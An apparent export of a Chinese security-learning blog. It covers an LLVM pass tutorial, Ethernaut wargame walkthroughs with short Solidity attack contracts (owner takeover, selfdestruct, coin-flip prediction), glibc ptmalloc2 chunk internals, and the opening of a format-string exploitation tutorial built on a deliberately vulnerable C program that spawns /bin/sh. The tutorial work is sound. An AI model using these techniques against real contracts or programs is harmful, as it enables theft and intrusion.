&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//注册类Hello，第一个参数是命令行参数，第二个参数是名字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>其中，Hello模块的功能为输出程序所有的函数名接着将其编译为so文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
<p>现在再随便准备一个C语言程序，将其编译为<code>.ll</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure>
<p>最后使用opt加载so文件，测试下hello模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opt -load ./LLVMFirst.so -hello test.ll</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-13.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>LLVM PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>llvm学习（2）</title>
    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<h1>LLVM Pass学习（2）</h1>
]]></content>
  </entry>
  <entry>
    <title>区块链安全入门#2</title>
    <url>/2025/02/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-2/</url>
    <content><![CDATA[<h2 id="jfoUX">Ethernaut靶场</h2>
<h3 id="w0Ihj">level4</h3>
<p><strong>关键知识点：</strong><code>tx.origin</code>和<code>msg.sender</code>的区别</p>
<blockquote>
<h2 id="txorigin-vs-msgsender"><font style="color:rgba(0, 0, 0, 0.87);">tx.origin vs msg.sender</font>[¶](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)</h2>
<ul class="lvl-1">
<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">这里区分一下 tx.origin 和 msg.sender ，msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 tx.origin 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</font></li>
<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">给定这样一个场景如：用户通过合约 A 调合约 B，此时：</font>
<ul class="lvl-3">
<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 A : tx.origin 和 msg.sender 都是用户</font></li>
<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">对于合约 B : tx.origin 是用户，msg.sender 是合约 A</font></li>
</ul>
</li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);">                                                             ——CTF-WIKI</font></p>
</blockquote>
<h4 id="C2kEY">POC</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  Telephone pubclic target = Telephone(&#x27;账户地址&#x27;);</span><br><span class="line">  function pwn() public&#123;</span><br><span class="line">    target.changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="lTz9G">level5</h3>
<p>**关键知识点：**溢出攻击</p>
<h4 id="cqWqf">POC</h4>
<p>版本0.6，存在下界溢出且无溢出保护，直接转21使得banlances=-1即可</p>
<h3 id="quy5G">level6</h3>
<p>**关键知识点：**委托调用</p>
<p>委托调用就相当于把另一个函数的的代码照抄照搬过来然后调用</p>
<h4 id="ugyxx">POC</h4>
<p>msg.data填为pwn函数地址即可</p>
<h3 id="dxFLn">level7</h3>
<p>**关键知识点：**自毁合约——<code>selfdestruct</code></p>
<h4 id="V6lNY">POC</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  function pwn(address _target) payable public &#123;</span><br><span class="line">    selfdestruct(payable(_target));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="eYpDx">level8</h3>
<p><strong>关键知识点：<strong>区块链特性——记录</strong>公开透明</strong></p>
<h4 id="D5TNf">POC</h4>
<p>翻转账记录，因为在区块链浏览器上所有数据都是公开透明的</p>
<h2 id="JrJRU">重入攻击</h2>
<p>我对重入攻击的理解是回调函数中断条件一直不被满足而导致的函数重复不断的调用</p>
<p>CTF-WIKI上的解释：</p>
<p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">Re-Entrancy - CTF Wiki</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ptmalloc2_源码详解_part1</title>
    <url>/2025/08/04/ptmalloc2-%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part1/</url>
    <content><![CDATA[<h1>ptmalloc2源码详解 Part1</h1>
<p>本系列讲解的版本为Glibc2.23</p>
<p>高版本的diff比如tcache bin的增加等会被放在heap exploitation系列中进行分析</p>
<hr>
<p>在正式开始malloc流程分析的讲解之前，我们先来了解点基础知识</p>
<h2 id="Chunk">Chunk</h2>
<p>在ptmalloc中，无论是申请内存还是释放内存，操作的对象都为<strong>堆块(Chunk)</strong></p>
<p>其在源码中的结构体表示为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一个chunk结构体中有六个字段，但是对于后两个字段：<code>fd_nextsize</code>和<code>bk_nextsize</code>，只有大小符合large bin的堆块才会用到，所以一个普通堆块的最小占用空间为<strong>4*INTERNAL_SIZE_T字节</strong>。</p>
<blockquote>
<p>INTERNAL_SIZE_T为机器字长</p>
<p>对于64位来讲，INTERNAL_SIZE_T的大小为8字节，那么堆块最小占用空间就为0x20字节</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">已申请堆块在内存中形如:</span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    			|             Size of previous chunk, if allocated            | |</span><br><span class="line">	    			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    			|             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h3 id="prev-size">prev_size</h3>
<p>这个字段只有当低地址的堆块被释放后才会被使用，<strong>指示了前一个堆块的大小</strong></p>
<p>这也就<strong>意味着此处空间是可以被复用的</strong>，即两个已分配堆块，前一个堆块可以使用后一个堆块的prev_size字段的空间</p>
<h3 id="size">size</h3>
<p><strong>当前堆块的大小</strong></p>
<p>在上图中可以看到<code>size</code>的最低位有两个字符<code>M</code>和<code>P</code>，其中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>P(PREV_INUSE)</strong>：该位被设置时，代表上一个堆块是一个正在使用的堆块</p>
</li>
<li class="lvl-2">
<p>**M(IS_MMAPED)：**该位被设置时，代表堆块内存是通过mmap分配的</p>
</li>
</ul>
<p>这里还有一个上图中未被提到的字段</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>**A(NON_MAIN_ARENA)：**记录当前堆块是否属于主进程</p>
</li>
</ul>
<p>这三个字段从高位到低位排序为：A-&gt;M-&gt;P</p>
<h3 id="fd和bk">fd和bk</h3>
<p><strong>双向链表中的前向和后继指针，只有当堆块被释放时才会被使用</strong></p>
<p>在堆块处于<strong>被分配状态时</strong>，从fd字段开始为用户空间，即上图中mem指向的位置</p>
<h3 id="fd-nextsize和bk-nextsize">fd_nextsize和bk_nextsize</h3>
<p>作用同fd和bk，但是<strong>只有大小处在largebin区间</strong>中的被释放的堆块才会使用这两个字段</p>
<h2 id="Chunk相关操作">Chunk相关操作</h2>
<p>在ptmalloc中，用户申请的内存大小和实际申请的内存大小是不一样的</p>
<h3 id="request2size">request2size</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="line"></span><br><span class="line">/* The corresponding bit mask value */</span><br><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="line"></span><br><span class="line">/* The smallest possible chunk */</span><br><span class="line">#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="line"></span><br><span class="line">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="line">#define MINSIZE  \</span><br><span class="line">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>假设在64位下此时用户想要申请0x20大小的内存</p>
<p>ptmalloc会使用<code>request2size</code>宏函数检查0x20(req)+0x8(SIZE_SZ)+0xf(MALLOC_ALIGN_MASK)是否小于0x20(MINSIZE)</p>
<p>如果小于的话，直接返回MINSIZE给用户，否则返回(0x20+0x8+0xf)&amp;~0xf即0x30给用户</p>
<p>这也就意味着：</p>
<ol>
<li class="lvl-3">
<p><strong>当申请小于0x20大小堆内存的时候，系统会直接返回0x20给用户</strong></p>
</li>
<li class="lvl-3">
<p><strong>当申请大于0x20大小堆内存的时候，系统会给原来申请大小加上0x10（prev_size和size字段所占用空间）并且最终对其到0x10</strong></p>
</li>
</ol>
<p>prev_size和size字段所处空间对于用户来说是透明的，因此对于最终返回给用户的指针是需要进行一些处理的</p>
<h3 id="chunk2mem、mem2chunk">chunk2mem、mem2chunk</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
<p>对于已经分配的 chunk，通过 chunk2mem 宏根据 chunk 地址获得返回给用户的内存地址</p>
<p>反过来通过 mem2chunk 宏根据 mem 地址得到 chunk 地址</p>
<p>chunk 的地址是按 2*SIZE_SZ对齐的，而 chunk 结构体的前两个域刚好也是 2*SIZE_SZ 大小，所以，mem 地址也是 2*SIZE_SZ 对齐的</p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>ptmalloc源码详解</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全入门</title>
    <url>/2025/02/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1>0x01 钱包创建</h1>
<h2 id="安装MetaMask拓展">安装MetaMask拓展</h2>
<p>可以在<a href="https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn?hl=zh-CN&amp;utm_source=ext_sidebar">Chrome拓展商店</a>下载并安装MetaMask拓展</p>
<p><img src="/images/pasted-21.png" alt="upload successful"></p>
<h2 id="创建钱包">创建钱包</h2>
<p>按照提示一步一步来即可获得一个钱包</p>
<h3 id="助记词">助记词</h3>
<p>在钱包创建完成前，MetaMask会提示你是否启用安全选项（即助记词）</p>
<blockquote>
<p>助记词是一组由随机生成的单词组成的短语，用于备份和恢复加密货币钱包的私钥</p>
</blockquote>
<p>助记词可通过BIP39工具生成</p>
<blockquote>
<p>BIP39（Bitcoin Improvement Proposal 39）是一种标准，它定义了一种生成和恢复加密货币钱包的方法，通过使用一组易于记忆的单词序列，即助记词。这些助记词可以生成种子，进而派生出加密货币钱包的私钥和地址。BIP39的主要作用是简化用户备份和恢复钱包的过程，同时提高安全性，因为它允许用户通过记住或写下这些单词来备份他们的钱包，而不是复杂的私钥字符串。</p>
</blockquote>
<p>BIP39工具安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install hdwallet</span><br></pre></td></tr></table></figure>
<h3 id="创建完成">创建完成</h3>
<p>创建完成后即可在Etherscan上查看账户信息</p>
<p><img src="/images/pasted-22.png" alt="upload successful"></p>
<h1>0x02 智能合约——Solidity语言</h1>
<p>Solidity 是一种专门用于编写智能合约的高级编程语言，主要用于以太坊及兼容以太坊虚拟机（EVM）的区块链平台，其作用是通过代码定义去中心化应用（DApp）的自动化规则和逻辑（如代币发行、交易协议等），并确保这些合约在区块链上安全、透明地执行。</p>
<h2 id="第一个合约">第一个合约</h2>
<p>在线IDE——<a href="https://remix.ethereum.org/"><strong>Remix</strong></a></p>
<p>合约，使用Solidity语言编写：</p>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<p>版本选择与编译：</p>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>连接metamask:</p>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<p><img src="/images/pasted-26.png" alt="upload successful"></p>
<p>部署合约：</p>
<p><img src="/images/pasted-27.png" alt="upload successful"></p>
<p>（但是付不起…）</p>
<h1>0x03 浅尝区块链安全</h1>
<p>Ethernaut靶场：<a href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com/</a></p>
<h2 id="第二关-Fallback">第二关 Fallback</h2>
<p>合约代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的取钱函数加上了<code>onlyOwner</code>修饰，即必须是合约所有者才能取钱</p>
<p>但是在<code>receive()</code>函数中，当<code>msg.value</code>和<code>contributions[msg.sender]</code>大于0我们就可以变成合约的所有者了</p>
<h3 id="PoC">PoC</h3>
<p>先contribute1GWei，然后再向合约转一点ETH即可变成owner</p>
<h2 id="第三关-Fallout">第三关 Fallout</h2>
<p>合约代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造函数命名错误</p>
<h3 id="Poc">Poc</h3>
<p>发送一点ETH即可变成owner</p>
<h2 id="第四关-Coin-Flip">第四关 Coin Flip</h2>
<p>合约代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其<code>coinFlip</code>是通过<code>blockValue / FACTOR</code>进行计算的</p>
<p>即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">coinFlip = uint256(blockhash(block.number - 1)) / FACTOR</span><br></pre></td></tr></table></figure>
<p><code>block.number</code>和<code>FACTOR</code>均为已知值</p>
<h3 id="PoC-2">PoC</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PoC&#123;</span><br><span class="line">    CoinFlip public target;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _guess() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>非栈上格式化字符串利用Part1</title>
    <url>/2025/05/24/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2Part1/</url>
    <content><![CDATA[<h1>0x1 概述</h1>
<p>非栈上格式化字符串漏洞特指在<code>printf(char *fmt, ...)</code>函数调用中，格式字符串参数<code>fmt</code>的存储位置不在当前函数栈帧中的情况。其常见表现形式主要包括以下两种类型：</p>
<ul class="lvl-0">
<li class="lvl-2">全局变量传入：当格式字符串通过存储在全局数据区（<code>.bss</code>段）的全局变量进行传递时</li>
<li class="lvl-2">堆指针传入：当格式字符串指针指向通过<code>malloc</code>等函数动态分配的堆内存区域时</li>
</ul>
<p>非栈上格式化字符串和栈上格式化字符串漏洞利用最大的区别就是<strong>非栈上格式化字符串漏洞无法通过操控或者布局栈上的变量来实现任意地址写等操作</strong>。对于Part1，我们先来介绍一个比较简单的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="comment">// gcc -fstack-protector-all -no-pie -z now -o main main.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inits</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter \&quot;quit\&quot; to stop program!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! backdoor found!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buf,<span class="string">&quot;quit&quot;</span>, <span class="number">4</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(buf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    inits();</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译后checksec<br>
<img src="https://www.mmmick.cn/images/pasted-30.png" alt="upload successful"><br>
除了PIE，其余保护全开如果这题是在栈上的话，那思路很明确：泄露栈地址-&gt;将$bp+8填到栈上-&gt;修改返回地址为backdoor即可。但是对于本题就不一样了，我们所输入的内容都被放到了堆中，无法控制栈布局来任意修改地址。这时候就要引入ex师傅所提出的<a href="https://blog.eonew.cn/2019/08/27/printf-%E6%88%90%E9%93%BE%E6%94%BB%E5%87%BB/">printf 成链攻击</a>，成链攻击主要是利用栈上的数据链来进行攻击。</p>
<h1>0x2 利用</h1>
<p>我们接下来要利用的链<strong>形如</strong>下图<img src="https://www.mmmick.cn/images/pasted-31.png" alt="upload successful"><br>
众所周知，对于格式化字符串，如果我们修改某个地址上的值，所使用的占位符为<code>%n</code>，而<code>%n</code>所修改的参数为一个地址，这也就是为什么需要一条二级以上的数据链进行攻击的原因了。对于非栈上格式化字符串，我们既然无法控制栈布局，为何不尝试下直接控制栈上已有变量，将栈变成我们想要的样子呢？对于此，我们可以先将三级链的<strong>第二级</strong>栈地址和当前函数调用栈的<strong>返回地址</strong>给泄露出来<img src="https://www.mmmick.cn/images/pasted-32.png" alt="upload successful"><br>
观察发现，三级链的最后一级的地址和<code>$bp+8</code>仅有低三位不同，因此我们可以把<code>0x7fff1a1487a8 —▸ 0x7fff1a148898 —▸ 0x7fff1a148bc2 ◂— 0x53006e69616d2f2e /* './main' */</code><br>
修改为<code>0x7fff1a1487a8 —▸ 0x7fff1a148898 —▸ 0x7fff1a148768 —▸ 0x4013e2 (main+47) ◂— mov eax, 0</code><br>
<img src="https://www.mmmick.cn/images/pasted-33.png" alt="upload successful"><br>
这样其实就间接实现了上面所述的<strong>将$bp+8填到栈上</strong>这一步骤到这里的exp为</p>
